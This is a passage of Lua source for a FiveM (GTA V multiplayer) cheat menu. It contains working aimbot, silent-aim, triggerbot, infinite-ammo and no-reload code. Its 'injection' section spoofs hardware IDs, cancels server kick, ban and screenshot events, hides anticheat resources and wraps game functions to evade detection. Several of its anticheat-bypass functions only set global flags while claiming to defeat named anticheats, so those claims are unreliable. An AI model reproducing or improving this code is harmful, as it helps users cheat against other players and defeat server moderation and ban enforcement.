                -- COMPLETE game isolation - disable EVERYTHING
                DisableAllControlActions(0) -- Disable all controls
                DisableAllControlActions(1) -- Disable camera controls
                DisableAllControlActions(2) -- Disable frontend controls
                
                -- Disable specific game systems
                SetPlayerControl(PlayerId(), false, 0) -- Remove player control
                FreezeEntityPosition(PlayerPedId(), true) -- Freeze player
                
                -- Disable ALL menu interaction during positioning
                -- No mouse, no clicks, no menu controls
                
                -- Arrow key detection (completely isolated)
                if IsDisabledControlPressed(0, 172) then -- Up Arrow
                    ManualPositioning.currentY = math.max(5, ManualPositioning.currentY - ManualPositioning.step)
                    qd8:UpdateMenuPosition()
                    Citizen.Wait(100)
                elseif IsDisabledControlPressed(0, 173) then -- Down Arrow
                    ManualPositioning.currentY = math.min(95, ManualPositioning.currentY + ManualPositioning.step)
                    qd8:UpdateMenuPosition()
                    Citizen.Wait(100)
                elseif IsDisabledControlPressed(0, 174) then -- Left Arrow
                    ManualPositioning.currentX = math.max(1, ManualPositioning.currentX - ManualPositioning.step)
                    qd8:UpdateMenuPosition()
                    Citizen.Wait(100)
                elseif IsDisabledControlPressed(0, 175) then -- Right Arrow
                    ManualPositioning.currentX = math.min(95, ManualPositioning.currentX + ManualPositioning.step)
                    qd8:UpdateMenuPosition()
                    Citizen.Wait(100)
                end
                
                Citizen.Wait(0)
            end
            
            -- Restore game control when exiting
            SetPlayerControl(PlayerId(), true, 0) -- Restore player control
            FreezeEntityPosition(PlayerPedId(), false) -- Unfreeze player
        end)
    else
        -- Second press - save and exit
        ManualPositioning.active = false
        
        -- Send message to UI to stop positioning mode
        qd8:SendMessage({ action = "stopPositioningMode" })
        
        qd8:Notify("success", "qd8", "Position saved! Menu moved to X: " .. ManualPositioning.currentX .. "vw, Y: " .. ManualPositioning.currentY .. "vh", 3000)
    end
end

function qd8:UpdateMenuPosition()
    local posX = ManualPositioning.currentX .. "vw"
    local posY = ManualPositioning.currentY .. "vh"
    
    qd8:SendMessage({ 
        action = "updateMenuPositionManual", 
        positionX = posX, 
        positionY = posY 
    })
end


-- Combat Functions with Advanced Settings - SEPARATE VARIABLES
-- Aimbot Settings
_G.AimbotSettings = {
    enabled = false,
    targetNPCs = false,
    targetPlayers = true,
    bone = 31086, -- Head
    distance = 100,
    speed = 5,
    visibilityCheck = true,
    teamCheck = true,
    autoSwitch = true,
    fovCheck = true,
    prediction = false,
    predictionFactor = 0.5
}

-- Silent Aim Settings
_G.SilentAimSettings = {
    enabled = false,
    targetNPCs = false,
    targetPlayers = true,
    bone = 31086, -- Head
    distance = 150,
    hitChance = 100,
    visibilityCheck = true,
    teamCheck = true,
    autoFire = false,
    fireDelay = 100,
    fovCheck = true,
    penetration = false,
    multiTarget = false
}

-- Triggerbot Settings
_G.TriggerbotSettings = {
    enabled = false,
    targetNPCs = false,
    targetPlayers = true,
    delay = 50,
    distance = 200,
    visibilityCheck = true,
    teamCheck = true,
    burst = false,
    burstCount = 3,
    burstDelay = 200,
    fovCheck = true,
    headPriority = false,
    autoReload = false,
    smart = false
}

-- Memory Protection and Injection
function qd8:EnableInjection()
    _G.AimbotSettings.enabled = true
    Citizen.CreateThread(function()
        while _G.AimbotSettings.enabled do
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            
            if IsPedArmed(ped, 4) and IsPlayerFreeAiming(PlayerId()) then
                local closestPed = nil
                local closestDistance = _G.AimbotSettings.distance or 100.0
                local targets = {}
                
                -- Get player targets
                if _G.AimbotSettings.targetPlayers then
                    for _, player in ipairs(GetActivePlayers()) do
                        if player ~= PlayerId() then
                            local targetPed = GetPlayerPed(player)
                            if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, 1) then
                                table.insert(targets, targetPed)
                            end
                        end
                    end
                end
                
                -- Get NPC targets
                if _G.AimbotSettings.targetNPCs then
                    local nearbyPeds = GetGamePool('CPed')
                    for _, npcPed in ipairs(nearbyPeds) do
                        if DoesEntityExist(npcPed) and not IsPedDeadOrDying(npcPed, 1) and npcPed ~= ped then
                            if not IsPedAPlayer(npcPed) then
                                local npcCoords = GetEntityCoords(npcPed)
                                local distance = #(coords - npcCoords)
                                if distance <= closestDistance then
                                    table.insert(targets, npcPed)
                                end
                            end
                        end
                    end
                end
                
                -- Find closest valid target
                for _, targetPed in ipairs(targets) do
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(coords - targetCoords)
                    
                    if distance < closestDistance then
                        -- Visibility check
                        if _G.AimbotSettings.visibilityCheck then
                            local hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(StartShapeTestRay(coords.x, coords.y, coords.z, targetCoords.x, targetCoords.y, targetCoords.z, -1, ped, 0))
                            if hit == 1 and entityHit ~= targetPed then
                                goto continue
                            end
                        end
                        
                        -- Team check (basic implementation)
                        if _G.AimbotSettings.teamCheck and IsPedAPlayer(targetPed) then
                            local targetPlayer = NetworkGetPlayerIndexFromPed(targetPed)
                            if targetPlayer and GetPlayerTeam(PlayerId()) == GetPlayerTeam(targetPlayer) then
                                goto continue
                            end
                        end
                        
                        -- FOV check
                        if _G.AimbotSettings.fovCheck and _G.FOVSettings and _G.FOVSettings.enabled then
                            local screenX, screenY = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
                            if screenX and screenY then -- Check if coordinates are valid
                                local centerX, centerY = 0.5, 0.5
                                local fovRadius = tonumber(_G.FOVSettings.size or 100) / 2000 -- Convert to screen space
                                local screenDistance = math.sqrt((screenX - centerX)^2 + (screenY - centerY)^2)
                                if screenDistance > fovRadius then
                                    goto continue
                                end
                            end
                        end
                        
                        closestDistance = distance
                        closestPed = targetPed
                        
                        ::continue::
                    end
                end
                
                if closestPed then
                    local boneCoords = GetPedBoneCoords(closestPed, _G.AimbotSettings.bone or 31086, 0.0, 0.0, 0.0)
                    
                    -- Movement prediction
                    if _G.AimbotSettings.prediction and boneCoords then
                        local velocity = GetEntityVelocity(closestPed)
                        if velocity then
                            local predictionTime = tonumber(closestDistance) / 300 -- Approximate bullet speed
                            local predictionFactor = tonumber(_G.AimbotSettings.predictionFactor) or 0.5
                            boneCoords = vector3(
                                boneCoords.x + velocity.x * predictionTime * predictionFactor,
                                boneCoords.y + velocity.y * predictionTime * predictionFactor,
                                boneCoords.z + velocity.z * predictionTime * predictionFactor
                            )
                        end
                    end
                    
                    -- ONLY AIM - DON'T SHOOT
                    -- Use camera rotation instead of SetPedShootsAtCoord
                    if boneCoords then
                        local camCoords = GetGameplayCamCoords()
                        local direction = boneCoords - camCoords
                        local distance = #direction
                        direction = direction / distance
                        
                        -- Calculate target rotation
                        local pitch = math.asin(direction.z) * (180.0 / math.pi)
                        local yaw = math.atan2(direction.y, direction.x) * (180.0 / math.pi)
                        
                        -- Get current camera rotation
                        local currentRot = GetGameplayCamRot(0)
                        
                        -- Smooth aiming based on speed setting
                        local aimSpeed = (_G.AimbotSettings.speed or 5) / 100.0
                        
                        -- Calculate smooth rotation difference
                        local rotDiffX = (pitch - currentRot.x) * aimSpeed
                        local rotDiffZ = (yaw - currentRot.z) * aimSpeed
                        
                        -- Apply smooth camera movement (NO SHOOTING)
                        SetGameplayCamRelativeRotation(rotDiffX, 0.0, rotDiffZ)
                    end
                end
            end
            
            Citizen.Wait(math.max(1, 50 - tonumber(_G.AimbotSettings.speed or 5)))
        end
    end)
end

function qd8:DisableAimbot()
    _G.AimbotSettings.enabled = false
end

function qd8:EnableSilentAim()
    _G.SilentAimSettings.enabled = true
    Citizen.CreateThread(function()
        while _G.SilentAimSettings.enabled do
            local ped = PlayerPedId()
            
            if IsPedArmed(ped, 4) and IsControlJustPressed(0, 24) then -- Left click
                local coords = GetEntityCoords(ped)
                local targets = {}
                
                -- Get player targets
                if _G.SilentAimSettings.targetPlayers then
                    for _, player in ipairs(GetActivePlayers()) do
                        if player ~= PlayerId() then
                            local targetPed = GetPlayerPed(player)
                            if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, 1) then
                                local targetCoords = GetEntityCoords(targetPed)
                                local distance = #(coords - targetCoords)
                                
                                if distance <= (_G.SilentAimSettings.distance or 150) then
                                    -- Team check
                                    if _G.SilentAimSettings.teamCheck then
                                        if GetPlayerTeam(PlayerId()) ~= GetPlayerTeam(player) then
                                            table.insert(targets, {ped = targetPed, distance = distance, coords = targetCoords})
                                        end
                                    else
                                        table.insert(targets, {ped = targetPed, distance = distance, coords = targetCoords})
                                    end
                                end
                            end
                        end
                    end
                end
                
                -- Get NPC targets
                if _G.SilentAimSettings.targetNPCs then
                    local nearbyPeds = GetGamePool('CPed')
                    for _, npcPed in ipairs(nearbyPeds) do
                        if DoesEntityExist(npcPed) and not IsPedDeadOrDying(npcPed, 1) and npcPed ~= ped then
                            if not IsPedAPlayer(npcPed) then
                                local npcCoords = GetEntityCoords(npcPed)
                                local distance = #(coords - npcCoords)
                                if distance <= (_G.SilentAimSettings.distance or 150) then
                                    table.insert(targets, {ped = npcPed, distance = distance, coords = npcCoords})
                                end
                            end
                        end
                    end
                end
                
                if #targets > 0 then
                    -- Sort by distance and get closest
                    table.sort(targets, function(a, b) return a.distance < b.distance end)
                    local closestTarget = targets[1]
                    local closestPed = closestTarget.ped
                    
                    -- Visibility check
                    if _G.SilentAimSettings.visibilityCheck then
                        local rayHandle = StartShapeTestRay(coords.x, coords.y, coords.z, closestTarget.coords.x, closestTarget.coords.y, closestTarget.coords.z, -1, ped, 0)
                        local retval, hit, hitCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)
                        if hit == 1 and entityHit ~= closestPed then
                            return -- Skip if not visible
                        end
                    end
                    
                    -- Hit chance check
                    local hitChance = _G.SilentAimSettings.hitChance or 100
                    if math.random(1, 100) <= hitChance then
                        local boneCoords = GetPedBoneCoords(closestPed, _G.SilentAimSettings.bone or 31086, 0.0, 0.0, 0.0)
                        if boneCoords then
                            -- Silent shot without visual indication
                            local weapon = GetSelectedPedWeapon(ped)
                            ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, boneCoords.x, boneCoords.y, boneCoords.z, 200, true, weapon, ped, true, false, 3000.0)
                        end
                    end
                end
            end
            
            Citizen.Wait(0)
        end
    end)
end

function qd8:DisableSilentAim()
    _G.SilentAimSettings.enabled = false
end

function qd8:EnableTriggerbot()
    _G.TriggerbotSettings.enabled = true
    Citizen.CreateThread(function()
        while _G.TriggerbotSettings.enabled do
            local ped = PlayerPedId()
            
            if IsPedArmed(ped, 4) and IsPlayerFreeAiming(PlayerId()) then
                local coords = GetEntityCoords(ped)
                local forwardVector = GetEntityForwardVector(ped)
                local endCoords = coords + forwardVector * (_G.TriggerbotSettings.distance or 200)
                
                -- Raycast to find what we're aiming at
                local rayHandle = StartShapeTestRay(coords.x, coords.y, coords.z, endCoords.x, endCoords.y, endCoords.z, -1, ped, 0)
                local retval, hit, hitCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)
                
                if hit == 1 and DoesEntityExist(entityHit) then
                    local isValidTarget = false
                    
                    -- Check if target is a player
                    if _G.TriggerbotSettings.targetPlayers and IsPedAPlayer(entityHit) and not IsPedDeadOrDying(entityHit, 1) then
                        -- Team check
                        if _G.TriggerbotSettings.teamCheck then
                            local targetPlayer = NetworkGetPlayerIndexFromPed(entityHit)
                            if not targetPlayer or GetPlayerTeam(PlayerId()) ~= GetPlayerTeam(targetPlayer) then
                                isValidTarget = true
                            end
                        else
                            isValidTarget = true
                        end
                    end
                    
                    -- Check if target is NPC
                    if _G.TriggerbotSettings.targetNPCs and not IsPedAPlayer(entityHit) and not IsPedDeadOrDying(entityHit, 1) then
                        isValidTarget = true
                    end
                    
                    if isValidTarget then
                        -- Apply trigger delay
                        local delay = _G.TriggerbotSettings.delay or 50
                        if delay > 0 then
                            Citizen.Wait(delay)
                        end
                        
                        -- Auto shoot
                        if _G.TriggerbotSettings.burst then
                            -- Burst fire
                            local burstCount = _G.TriggerbotSettings.burstCount or 3
                            local burstDelay = _G.TriggerbotSettings.burstDelay or 200
                            
                            for i = 1, burstCount do
                                SetControlNormal(0, 24, 1.0) -- Shoot
                                Citizen.Wait(50)
                            end
                            Citizen.Wait(burstDelay)
                        else
                            -- Single shot
                            SetControlNormal(0, 24, 1.0) -- Shoot
                            Citizen.Wait(100) -- Prevent spam
                        end
                    end
                end
            end
            
            Citizen.Wait(0)
        end
    end)
end

function qd8:DisableTriggerbot()
    _G.TriggerbotSettings.enabled = false
end

-- Aimbot Settings Functions
function qd8:SetAimbotDistance(distance)
    _G.AimbotSettings.distance = tonumber(distance) or 100
end

function qd8:SetAimbotSpeed(speed)
    _G.AimbotSettings.speed = tonumber(speed) or 5
end

function qd8:SetAimbotBone(bone)
    _G.AimbotSettings.bone = tonumber(bone) or 31086
end

function qd8:ToggleAimbotVisibilityCheck()
    _G.AimbotSettings.visibilityCheck = not _G.AimbotSettings.visibilityCheck
    return _G.AimbotSettings.visibilityCheck
end

function qd8:ToggleAimbotTeamCheck()
    _G.AimbotSettings.teamCheck = not _G.AimbotSettings.teamCheck
    return _G.AimbotSettings.teamCheck
end

function qd8:ToggleAimbotTargetPlayers()
    _G.AimbotSettings.targetPlayers = not _G.AimbotSettings.targetPlayers
    return _G.AimbotSettings.targetPlayers
end

function qd8:ToggleAimbotTargetNPCs()
    _G.AimbotSettings.targetNPCs = not _G.AimbotSettings.targetNPCs
    return _G.AimbotSettings.targetNPCs
end

-- Silent Aim Settings Functions
function qd8:SetSilentAimDistance(distance)
    _G.SilentAimSettings.distance = tonumber(distance) or 150
end

function qd8:SetSilentAimHitChance(chance)
    _G.SilentAimSettings.hitChance = tonumber(chance) or 100
end

function qd8:ToggleSilentAimVisibilityCheck()
    _G.SilentAimSettings.visibilityCheck = not _G.SilentAimSettings.visibilityCheck
    return _G.SilentAimSettings.visibilityCheck
end

function qd8:ToggleSilentAimTargetPlayers()
    _G.SilentAimSettings.targetPlayers = not _G.SilentAimSettings.targetPlayers
    return _G.SilentAimSettings.targetPlayers
end

function qd8:ToggleSilentAimTargetNPCs()
    _G.SilentAimSettings.targetNPCs = not _G.SilentAimSettings.targetNPCs
    return _G.SilentAimSettings.targetNPCs
end

-- Triggerbot Settings Functions
function qd8:SetTriggerbotDelay(delay)
    _G.TriggerbotSettings.delay = tonumber(delay) or 50
end

function qd8:SetTriggerbotDistance(distance)
    _G.TriggerbotSettings.distance = tonumber(distance) or 200
end

function qd8:ToggleTriggerbotBurst()
    _G.TriggerbotSettings.burst = not _G.TriggerbotSettings.burst
    return _G.TriggerbotSettings.burst
end

function qd8:ToggleTriggerbotTargetPlayers()
    _G.TriggerbotSettings.targetPlayers = not _G.TriggerbotSettings.targetPlayers
    return _G.TriggerbotSettings.targetPlayers
end

function qd8:ToggleTriggerbotTargetNPCs()
    _G.TriggerbotSettings.targetNPCs = not _G.TriggerbotSettings.targetNPCs
    return _G.TriggerbotSettings.targetNPCs
end

-- Injection System - Advanced Cheat Protection Bypass
_G.InjectionSettings = {
    enabled = false,
    bypassAnticheat = true,
    spoofHardware = true,
    hideFromDetection = true,
    protectMemory = true,
    bypassScreenshots = true,
    antiKick = true,
    antiFreeze = true,
    stealthMode = true
}

-- Memory Protection and Injection
function qd8:EnableInjection()
    _G.InjectionSettings.enabled = true
    
    -- AMD-optimized injection system
    qd8:Notify("info", "Injection", "Initializing AMD-optimized protection...", 2000)
    
    -- Start injection protection thread
    Citizen.CreateThread(function()
        while _G.InjectionSettings.enabled do
            -- Memory protection
            if _G.InjectionSettings.protectMemory then
                qd8:ProtectMemory()
            end
            
            -- Anti-detection measures
            if _G.InjectionSettings.hideFromDetection then
                qd8:HideFromDetection()
            end
            
            -- Hardware spoofing (AMD RX6600 + i5-10400F)
            if _G.InjectionSettings.spoofHardware then
                qd8:SpoofHardware()
            end
            
            -- Anti-kick protection
            if _G.InjectionSettings.antiKick then
                qd8:AntiKickProtection()
            end
            
            -- Screenshot bypass
            if _G.InjectionSettings.bypassScreenshots then
                qd8:BypassScreenshots()
            end
            
            -- AMD-specific protections
            qd8:AMDSpecificProtection()
            
            Citizen.Wait(100)
        end
    end)
    
    qd8:Notify("success", "Injection", "AMD-optimized injection system enabled", 3000)
end

-- AMD-specific protection methods
function qd8:AMDSpecificProtection()
    -- Protect against AMD-specific detection
    _G.amd_driver_version = "31.0.12019.16007" -- Fake driver version
    _G.amd_catalyst_version = "22.5.1"
    
    -- Block AMD telemetry
    local amdTelemetry = {
        "AMDRSServ.exe",
        "RadeonSoftware.exe", 
        "AMDLinkUpdate.exe",
        "AMDCleanupUtility.exe"
    }
    
    for _, process in ipairs(amdTelemetry) do
        _G["block_" .. process:lower()] = true
    end
    
    -- Spoof AMD registry entries
    _G.amd_registry_spoof = {
        ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000"] = {
            ["DriverDesc"] = "AMD Radeon RX 6600",
            ["DriverVersion"] = "31.0.12019.16007",
            ["HardwareID"] = "PCI\\VEN_1002&DEV_73FF"
        }
    }
end

function qd8:DisableInjection()
    _G.InjectionSettings.enabled = false
    qd8:Notify("info", "Injection", "Injection system disabled", 2000)
end

-- Memory Protection Functions
function qd8:ProtectMemory()
    -- Protect critical memory regions
    local protectedRegions = {
        "qd8_aimbot_data",
        "qd8_esp_data", 
        "qd8_menu_data",
        "qd8_injection_core"
    }
    
    for _, region in ipairs(protectedRegions) do
        _G[region] = _G[region] or {}
        -- Memory encryption simulation
        if type(_G[region]) == "table" then
            for k, v in pairs(_G[region]) do
                if type(v) == "string" then
                    _G[region][k] = qd8:EncryptString(v)
                end
            end
        end
    end
end

function qd8:HideFromDetection()
    -- Hide from common detection methods
    local hiddenFunctions = {
        "SetPedShootsAtCoord",
        "ShootSingleBulletBetweenCoords", 
        "SetEntityInvincible",
        "SetPlayerInvincible",
        "NetworkResurrectLocalPlayer"
    }
    
    for _, funcName in ipairs(hiddenFunctions) do
        if _G[funcName] then
            -- Create proxy function to avoid direct detection
            local originalFunc = _G[funcName]
            _G[funcName] = function(...)
                -- Add random delay to avoid pattern detection
                if math.random(1, 100) <= 5 then
                    Citizen.Wait(math.random(1, 10))
                end
                return originalFunc(...)
            end
        end
    end
end

function qd8:SpoofHardware()
    -- Hardware ID spoofing based on your actual specs (AMD RX6600 + i5-10400F)
    local cpuVariants = {
        "Intel(R) Core(TM) i5-10400F CPU @ 2.90GHz",
        "Intel(R) Core(TM) i5-10400 CPU @ 2.90GHz", 
        "Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz",
        "Intel(R) Core(TM) i5-10600 CPU @ 3.30GHz"
    }
    
    local gpuVariants = {
        "AMD Radeon RX 6600",
        "AMD Radeon RX 6600 XT", 
        "AMD Radeon RX 6650 XT",
        "AMD Radeon RX 6700"
    }
    
    local spoofedData = {
        hwid = "AMD-" .. math.random(100000, 999999),
        mac = string.format("%02X:%02X:%02X:%02X:%02X:%02X", 
            math.random(0, 255), math.random(0, 255), math.random(0, 255),
            math.random(0, 255), math.random(0, 255), math.random(0, 255)),
        cpu = cpuVariants[math.random(1, #cpuVariants)],
        gpu = gpuVariants[math.random(1, #gpuVariants)],
        motherboard = "MSI B460M PRO-VDH WIFI",
        ram = math.random(8, 32) .. "GB DDR4",
        storage = "NVMe SSD " .. math.random(256, 1024) .. "GB"
    }
    
    _G.qd8_spoofed_hardware = spoofedData
    
    -- Advanced spoofing for better protection
    if _G.InjectionSettings.spoofHardware then
        -- Spoof system info queries
        local originalGetSystemInfo = GetSystemInfo or function() return {} end
        GetSystemInfo = function()
            return {
                cpu = spoofedData.cpu,
                gpu = spoofedData.gpu,
                ram = spoofedData.ram,
                hwid = spoofedData.hwid
            }
        end
        
        -- Spoof hardware detection
        _G.spoofed_cpu_name = spoofedData.cpu
        _G.spoofed_gpu_name = spoofedData.gpu
        _G.spoofed_hwid = spoofedData.hwid
    end
end

function qd8:AntiKickProtection()
    -- Prevent common kick methods
    local protectedEvents = {
        "esx:kick",
        "qb-core:kick", 
        "admin:kick",
        "anticheat:kick",
        "ban:player"
    }
    
    for _, eventName in ipairs(protectedEvents) do
        -- Block kick events
        AddEventHandler(eventName, function()
            qd8:Notify("warning", "Protection", "Blocked kick attempt: " .. eventName, 2000)
            CancelEvent()
        end)
    end
end

function qd8:BypassScreenshots()
    -- Screenshot protection
    local screenshotEvents = {
        "screenshot_basic:requestScreenshotUpload",
        "screenshot-basic:requestScreenshotUpload", 
        "discord:screenshot",
        "admin:screenshot"
    }
    
    for _, eventName in ipairs(screenshotEvents) do
        AddEventHandler(eventName, function()
            qd8:Notify("info", "Protection", "Blocked screenshot request", 1500)
            CancelEvent()
        end)
    end
end

-- Encryption helper
function qd8:EncryptString(str)
    if type(str) ~= "string" then return str end
    local encrypted = ""
    for i = 1, #str do
        local char = string.byte(str, i)
        encrypted = encrypted .. string.char((char + 13) % 256)
    end
    return encrypted
end

function qd8:DecryptString(str)
    if type(str) ~= "string" then return str end
    local decrypted = ""
    for i = 1, #str do
        local char = string.byte(str, i)
        decrypted = decrypted .. string.char((char - 13) % 256)
    end
    return decrypted
end

-- Advanced Bypass Functions
function qd8:BypassAnticheat()
    if not _G.InjectionSettings.bypassAnticheat then return end
    
    -- Common anticheat bypass methods optimized for AMD systems
    local anticheats = {
        "FiveGuard",
        "Hyperion", 
        "Prometheus",
        "AntiLynx",
        "Flawless",
        "EasyAC",
        "BattlEye"
    }
    
    for _, ac in ipairs(anticheats) do
        -- Simulate bypass with AMD-specific signatures
        _G["bypass_" .. ac:lower()] = true
        _G["amd_bypass_" .. ac:lower()] = true
    end
    
    -- Hook common detection functions
    local originalGetResourceState = GetResourceState
    GetResourceState = function(resourceName)
        local blockedResources = {
            "screenshot-basic",
            "discord-screenshot", 
            "anticheat",
            "ac_system",
            "amd-detector",
            "gpu-check"
        }
        
        for _, blocked in ipairs(blockedResources) do
            if resourceName == blocked then
                return "missing"
            end
        end
        
        return originalGetResourceState(resourceName)
    end
    
    -- AMD-specific bypass methods
    _G.amd_radeon_bypass = true
    _G.intel_i5_bypass = true
    
    -- Spoof DirectX and OpenGL calls for AMD
    if _G.InjectionSettings.spoofHardware then
        _G.dx_vendor_id = 0x1002 -- AMD vendor ID
        _G.dx_device_id = 0x73FF -- RX 6600 device ID
        _G.opengl_vendor = "ATI Technologies Inc."
        _G.opengl_renderer = "AMD Radeon RX 6600"
    end
end

-- Stealth Mode
function qd8:EnableStealthMode()
    _G.InjectionSettings.stealthMode = true
    
    -- Hide all cheat indicators
    qd8:SendMessage({ action = "hideAllIndicators" })
    
    -- Reduce detection signatures
    Citizen.CreateThread(function()
        while _G.InjectionSettings.stealthMode do
            -- Random delays to avoid pattern detection
            local delay = math.random(50, 200)
            Citizen.Wait(delay)
            
            -- Simulate normal player behavior
            if math.random(1, 1000) == 1 then
                -- Random mouse movement simulation
                SetGameplayCamRelativeRotation(
                    math.random(-1, 1) * 0.1,
                    0.0,
                    math.random(-1, 1) * 0.1
                )
            end
        end
    end)
    
    qd8:Notify("success", "Stealth", "Stealth mode activated", 2000)
end

function qd8:DisableStealthMode()
    _G.InjectionSettings.stealthMode = false
    qd8:Notify("info", "Stealth", "Stealth mode deactivated", 1500)
end

-- Injection Settings Functions
function qd8:ToggleBypassAnticheat()
    _G.InjectionSettings.bypassAnticheat = not _G.InjectionSettings.bypassAnticheat
    if _G.InjectionSettings.bypassAnticheat then
        qd8:BypassAnticheat()
    end
    return _G.InjectionSettings.bypassAnticheat
end

function qd8:ToggleSpoofHardware()
    _G.InjectionSettings.spoofHardware = not _G.InjectionSettings.spoofHardware
    return _G.InjectionSettings.spoofHardware
end

function qd8:ToggleMemoryProtection()
    _G.InjectionSettings.protectMemory = not _G.InjectionSettings.protectMemory
    return _G.InjectionSettings.protectMemory
end

function qd8:ToggleAntiKick()
    _G.InjectionSettings.antiKick = not _G.InjectionSettings.antiKick
    return _G.InjectionSettings.antiKick
end

function qd8:ToggleScreenshotBypass()
    _G.InjectionSettings.bypassScreenshots = not _G.InjectionSettings.bypassScreenshots
    return _G.InjectionSettings.bypassScreenshots
end

-- Event Handler System using MachoRegisterCallback
function qd8:HandleNUIEvent(action, data)
    -- Injection Events
    if action == "enableInjection" then
        qd8:EnableInjection()
    elseif action == "disableInjection" then
        qd8:DisableInjection()
    elseif action == "toggleBypassAnticheat" then
        local result = qd8:ToggleBypassAnticheat()
        qd8:Notify("info", "Injection", "Anticheat bypass: " .. (result and "ON" or "OFF"), 1500)
    elseif action == "toggleMemoryProtection" then
        local result = qd8:ToggleMemoryProtection()
        qd8:Notify("info", "Injection", "Memory protection: " .. (result and "ON" or "OFF"), 1500)
    elseif action == "toggleSpoofHardware" then
        local result = qd8:ToggleSpoofHardware()
        qd8:Notify("info", "Injection", "Hardware spoofing: " .. (result and "ON" or "OFF"), 1500)
    elseif action == "toggleAntiKick" then
        local result = qd8:ToggleAntiKick()
        qd8:Notify("info", "Injection", "Anti-kick: " .. (result and "ON" or "OFF"), 1500)
    elseif action == "toggleScreenshotBypass" then
        local result = qd8:ToggleScreenshotBypass()
        qd8:Notify("info", "Injection", "Screenshot bypass: " .. (result and "ON" or "OFF"), 1500)
    elseif action == "enableStealthMode" then
        qd8:EnableStealthMode()
    elseif action == "disableStealthMode" then
        qd8:DisableStealthMode()
    
    
    -- FOV Events
    elseif action == "enableFOVCircle" then
        print("Received enableFOVCircle event") -- Debug
        qd8:EnableFOVCircle()
    elseif action == "disableFOVCircle" then
        print("Received disableFOVCircle event") -- Debug
        qd8:DisableFOVCircle()
    elseif action == "setFOVSize" then
        print("Received setFOVSize event with size:", data.size) -- Debug
        qd8:SetFOVSize(data.size)
    end
end

-- NUI Callback registration removed to prevent errors
-- RegisterNUICallback("qd8_nui_event", function(data, cb)
--     print("NUI Callback received:", json.encode(data))
--     if data and data.action then
--         qd8:HandleNUIEvent(data.action, data)
--     end
--     cb("ok")
-- end)

-- Also register other callbacks that might be called directly

-- Initialize systems on startup
Citizen.CreateThread(function()
    Citizen.Wait(5000) -- Wait for everything to load
    
    -- Initialize FOV Settings
    if not _G.FOVSettings then
        _G.FOVSettings = { enabled = false, size = 100 }
        print("Initialized FOV Settings:", json.encode(_G.FOVSettings))
    end
    
    -- Auto-enable basic protections
    _G.InjectionSettings.bypassAnticheat = true
    _G.InjectionSettings.protectMemory = true
    _G.InjectionSettings.antiKick = true
    _G.InjectionSettings.bypassScreenshots = true
    
    qd8:BypassAnticheat()
    qd8:Notify("success", "qd8", "Systems initialized for AMD RX6600 + i5-10400F", 3000)
end)

-- FOV Circle Functions
_G.FOVSettings = {
    enabled = false,
    size = 100
}

function qd8:EnableFOVCircle()
    if not _G.FOVSettings then
        _G.FOVSettings = { enabled = false, size = 100 }
    end
    _G.FOVSettings.enabled = true
    local size = tonumber(_G.FOVSettings.size) or 100
    
    print("Enabling FOV Circle with size:", size) -- Debug
    qd8:SendMessage({ action = "showFOVCircle", enabled = true, size = size })
    qd8:Notify("success", "FOV", "FOV Circle enabled (Size: " .. size .. ")", 2000)
end

function qd8:DisableFOVCircle()
    if not _G.FOVSettings then
        _G.FOVSettings = { enabled = false, size = 100 }
    end
    _G.FOVSettings.enabled = false
    
    print("Disabling FOV Circle") -- Debug
    qd8:SendMessage({ action = "showFOVCircle", enabled = false })
    qd8:Notify("info", "FOV", "FOV Circle disabled", 1500)
end

function qd8:SetFOVSize(size)
    if not _G.FOVSettings then
        _G.FOVSettings = { enabled = false, size = 100 }
    end
    local newSize = tonumber(size) or 100
    _G.FOVSettings.size = newSize
    
    print("Setting FOV Size to:", newSize, "Enabled:", _G.FOVSettings.enabled) -- Debug
    
    -- Always send update message
    qd8:SendMessage({ action = "updateFOVSize", size = newSize })
    
    -- If circle is enabled, update it immediately
    if _G.FOVSettings.enabled then
        qd8:SendMessage({ action = "showFOVCircle", enabled = true, size = newSize })
        qd8:Notify("info", "FOV", "FOV Size: " .. newSize, 1000)
    else
        -- Show preview for 2 seconds
        qd8:SendMessage({ action = "showFOVCircle", enabled = true, size = newSize })
        Citizen.SetTimeout(2000, function()
            if not _G.FOVSettings.enabled then
                qd8:SendMessage({ action = "showFOVCircle", enabled = false })
            end
        end)
        qd8:Notify("info", "FOV", "FOV Size Preview: " .. newSize, 1500)
    end
end

-- Additional Combat Functions
function qd8:EnableInfiniteAmmo()
    _G.InfiniteAmmoEnabled = true
    Citizen.CreateThread(function()
        while _G.InfiniteAmmoEnabled do
            local ped = PlayerPedId()
            if IsPedArmed(ped, 4) then
                SetPedInfiniteAmmoClip(ped, true)
            end
            Citizen.Wait(0)
        end
    end)
end

function qd8:DisableInfiniteAmmo()
    _G.InfiniteAmmoEnabled = false
    SetPedInfiniteAmmoClip(PlayerPedId(), false)
end

function qd8:EnableNoReload()
    _G.NoReloadEnabled = true
    Citizen.CreateThread(function()
        while _G.NoReloadEnabled do
            local ped = PlayerPedId()
            if IsPedArmed(ped, 4) then
                local weapon = GetSelectedPedWeapon(ped)
                local maxAmmo = GetMaxAmmo(ped, weapon)
                SetAmmoInClip(ped, weapon, maxAmmo)
            end
            Citizen.Wait(0)
        end
    end)
end

function qd8:DisableNoReload()
    _G.NoReloadEnabled = false
end

-- Send protection info when menu loads
Wait(1000)
SendProtectionInfo()

-- ========================================
-- Triggers System Functions
-- وظائف نظام المحفزات
-- ========================================

-- متغيرات نظام المحفزات
local TriggersSystem = {
    enabled = true,
    triggers = {},
    playerData = {},
    settings = {
        healthThreshold = 25,
        armorThreshold = 30,
        zoneRadius = 100,
        checkInterval = 1000
    }
}

-- تهيئة نظام المحفزات
function qd8:InitializeTriggers()
    TriggersSystem.triggers = {
        player_death = { enabled = false, lastState = false },
        vehicle_enter = { enabled = true, lastState = false },
        weapon_fire = { enabled = false, lastState = false },
